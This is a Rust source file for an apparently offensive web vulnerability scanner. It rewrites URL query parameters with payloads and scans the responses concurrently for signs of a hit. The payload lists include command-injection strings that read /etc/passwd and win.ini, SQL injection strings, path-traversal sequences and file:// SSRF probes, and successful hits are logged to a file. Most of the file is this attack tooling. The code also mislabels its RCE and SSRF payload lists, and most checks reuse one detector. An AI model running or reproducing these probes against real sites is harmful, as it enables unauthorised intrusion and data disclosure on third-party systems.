
use std::error::Error;
use std::sync::{Arc, Mutex};
use reqwest::Client;
use tokio::{spawn, sync::Semaphore};
use regex::Regex;
use crate::outprint::Print;
use crate::tofile;

trait Scan {
    async fn fetch(&self, client: &Client, url: &str) -> Result<(), Box<dyn Error + Send + Sync>>;
}

async fn replace(url: &str, poc: &Vec<String>) -> Result<Vec<String>, Box<dyn Error + Send + Sync>> {
    let re = Regex::new(r"([?&])([^=]+)=([^&]*)")?;
    let mut urls = vec![];

    let captures: Vec<_> = re.captures_iter(url).collect();
    for i in 0..captures.len() {
        for p in poc {
            let modified_url = re.replace_all(url, |caps: &regex::Captures| {
                let key_to_replace = captures[i].get(2).unwrap().as_str();
                if caps.get(2).unwrap().as_str() == key_to_replace {
                    format!("{}{}={}", &caps[1], &caps[2], p)
                } else {
                    caps[0].to_string()
                }
            });
            urls.push(String::from(modified_url));
        }
    }
    Ok(urls)
}

struct Sql;
struct FileRead;
// struct Rce;

impl Scan for Sql {
    async fn fetch(&self, client: &Client, url: &str) -> Result<(), Box<dyn Error + Send + Sync>> {
        let res = client.get(url).send().await?;
        let vul = vec![
            "SQL syntax".to_string(),
            "PostgreSQL".to_string(),
            "SQL Server".to_string(),
            "Oracle error".to_string(),
            "DB2 SQL error".to_string(),
            "SQLite".to_string(),
        ];
        let text = res.text().await?;
        let mut res_vulns = vec![];
        vul.iter().for_each(|v| {
            if text.contains(v) {
                Print::vulnprint(url);
                res_vulns.push(url.to_string());
            }
        });
        if !res_vulns.is_empty() {
            tofile::vuln_save_to_file("vulns.txt",&res_vulns)?;
        }
        Ok(())
    }
}

impl Scan for FileRead {
    async fn fetch(&self, client: &Client, url: &str) -> Result<(), Box<dyn Error + Send + Sync>> {
        let res = client.get(url).send().await?;
        let vul = vec![
            "root:x".to_string(),
            "for 16-bit".to_string(),
        ];
        let mut res_vulns = vec![];
        let text = res.text().await?;
        vul.iter().for_each(|v| {
            if text.contains(v) {
                Print::vulnprint(url);
                res_vulns.push(url.to_string());
            }
        });
        if !res_vulns.is_empty() {
            tofile::vuln_save_to_file("vulns.txt",&res_vulns)?;
        }
        Ok(())
    }
}

// impl Scan for Rce {
//     async fn fetch(&self, client: &Client, url: &str) -> Result<(), Box<dyn Error + Send + Sync>> {
//         let res = client.get(url).send().await?;
//         let vul = vec![
//             "root:x".to_string(),
//             "16-bit".to_string(),
//         ];
//         let text = res.text().await?;
//         vul.iter().for_each(|v| {
//             if text.contains(v) {
//                 ResPrint::vulnprint(url);
//                 // println!("{}", url);
//             }
//         });
//         Ok(())
//     }
// }

async fn scan_urls_with_semaphore<S: Scan + Sync + Send + 'static>(
    scanner: Arc<Mutex<S>>,
    client: Arc<Client>,
    semaphore: Arc<Semaphore>,
    urls: Vec<String>,
) -> Result<(), Box<dyn Error + Send + Sync>> {
    let mut tasks = vec![];

    for url in urls {
        let permit = semaphore.clone().acquire_owned().await?;
        let scanner = scanner.clone();
        let client = client.clone();

        // 使用 block_in_place 让阻塞操作在同步线程中执行
        let task = spawn(async move {
            // 使用 block_in_place 在一个同步线程中进行锁操作
            tokio::task::block_in_place(move || {
                let scanner = scanner.lock().unwrap();
                // 在锁内执行任务
                let _ = tokio::runtime::Handle::current().block_on(scanner.fetch(client.as_ref(), &url));
            });
            drop(permit);
        });

        tasks.push(task);
    }

    // 等待所有任务完成
    for task in tasks {
        task.await.unwrap();
    }

    Ok(())
}

pub async fn vulnmain(threads:usize,client: Client,urls:Vec<String>) -> Result<(), Box<dyn Error + Send + Sync>> {
    let rce_payloads = vec![
        "cat /etc/passwd".to_string(),
        r#"type %windir%\win.ini"#.to_string(),
    ];
    let sql_payloads = vec![
        "') OR (78786=78678 --".to_string(),
        "'\" AND 78786=78678 --+a".to_string(),
        "1 AND 78786=78678 --+a".to_string(),
        "' OR 1=CAST(CHAR(65) AS INT) --".to_string(),
    ];
    let file_read_payloads = vec![
        r#"\c$\windows\win.ini"#.to_string(),
        "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd".to_string(),
        "/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/C:/windows/win.ini".to_string(),
    ];
    let ssrf_payloads = vec![
        "file:///etc/passwd".to_string(),
        "file:///C:/windows/win.ini".to_string(),
    ];
    let mut ssrf_urls = vec![];
    let mut sql_urls = vec![];
    let mut file_urls = vec![];
    let mut rce_urls = vec![];
    for url in &urls {
        ssrf_urls.extend(replace(url, &rce_payloads.clone()).await?);
        sql_urls.extend(replace(url, &sql_payloads.clone()).await?);
        file_urls.extend(replace(url, &file_read_payloads.clone()).await?);
        rce_urls.extend(replace(url, &ssrf_payloads.clone()).await?);
    }

    let rce_scan = FileRead;
    let sql_scan = Sql;
    let file_scan = FileRead;
    let ssrf_scan = FileRead;
    let client = Arc::new(client);
    let semaphore = Arc::new(Semaphore::new(threads));

    let rce_task = spawn(scan_urls_with_semaphore(Arc::new(Mutex::new(rce_scan)), client.clone(), semaphore.clone(), rce_urls));
    let sql_task = spawn(scan_urls_with_semaphore(Arc::new(Mutex::new(sql_scan)), client.clone(), semaphore.clone(), sql_urls));
    let file_task = spawn(scan_urls_with_semaphore(Arc::new(Mutex::new(file_scan)), client.clone(), semaphore.clone(), file_urls));
    let ssrf_task = spawn(scan_urls_with_semaphore(Arc::new(Mutex::new(ssrf_scan)), client.clone(), semaphore.clone(), ssrf_urls));

    let _ = tokio::try_join!(rce_task, sql_task, file_task, ssrf_task);

    Ok(())
}